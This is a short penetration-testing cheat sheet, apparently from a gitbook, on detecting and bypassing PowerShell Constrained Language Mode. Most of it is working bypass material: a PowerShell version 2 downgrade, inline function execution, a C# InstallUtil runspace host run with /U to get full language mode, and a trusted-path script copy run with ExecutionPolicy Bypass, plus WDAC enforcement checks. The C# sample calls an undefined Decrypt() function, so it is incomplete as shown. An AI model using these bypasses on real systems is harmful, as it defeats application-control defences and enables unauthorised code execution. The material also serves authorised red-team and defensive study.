# Powershell Constrained Language Mode (CLM) Bypass

https://viperone.gitbook.io/pentest-everything/everything/powershell/constrained-language-mode


Constrained Language Mode is a setting in PowerShell that greatly limits what commands can be performed. This can potentially reduce the available attack surface to adversary's.

By default PowerShell runs in Full Language Mode which all functions are available for use. This includes access to all language elements, cmdlets, and modules, as well as the file system and the network.

## Enumeration

##### Check current language mode

    $ExecutionContext.SessionState.LanguageMode

##### Simple command to see if Constrained Language is enabled in current session

    [System.Console]::WriteLine("ConstrainedModeTest")

Constrained Language mode can be set with the following commands.

##### Set Language mode to Constrained (Current Session)

    $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"

##### Environmental Variable, all new sessions will start in Constrained Mode

    [Environment]::SetEnvironmentVariable(‘__PSLockdownPolicy‘, ‘4’, ‘Machine‘)

## Bypass

### 1) Bypass by starting new PS session

    powershell.exe

### 2) Bypass by downgrading version to PowerShell 2

    Powershell.exe -version 2

### 3) Attempt command execution with inline functions

    &{hostname}

### 4) If PowerShell V6 is installed try executing

    pwsh

### 5) Host the Runspace through InstallUtil

CLMRunspaceHost.cs

    [RunInstaller(true)]
    public class CLMHost : Installer {
        // InstallUtil /U calls this. A runspace opened from managed code defaults to FullLanguage.
        public override void Uninstall(IDictionary savedState) {
            using (Runspace rs = RunspaceFactory.CreateRunspace()) {
                rs.Open();
                using (PowerShell ps = PowerShell.Create()) {
                    ps.Runspace = rs;
                    ps.AddScript("$ExecutionContext.SessionState.LanguageMode");
                    foreach (PSObject r in ps.Invoke())
                        Console.WriteLine("LanguageMode = " + r);
                }
            }
            Console.WriteLine("Get Rekt" + Decrypt());   // decrypt needs FullLanguage
        }
    }

Compile it, then run it

    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\CLM\CLMRunspaceHost.exe

### 6) Abuse a trusted path

Example folder

    Copy-Item $env:TEMP\t.ps1 C:\Windows\Temp\t.ps1

Run it

    powershell -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\t.ps1



## TIP: Constrained Language mode is often enabled in environments that enforce AppLocker

## TIP 2: Constrained Language mode was introduced in PowerShell version 3. As such it is not applicable to version 2 PowerShell sessions.

## TIP 3: Check for WDAC to not get burned out!

Check if SiPolicy.p7b is present (If true)

    Test-Path C:\Windows\System32\CodeIntegrity\SiPolicy.p7b

Check if CodeIntegrityPolicyEnforcementStatus reads 2.

    (Get-CimInstance -Namespace root\Microsoft\Windows\DeviceGuard -ClassName Win32_DeviceGuard).CodeIntegrityPolicyEnforcementStatus

If these are True and 2, then WDAC is enforcing in the kernel.
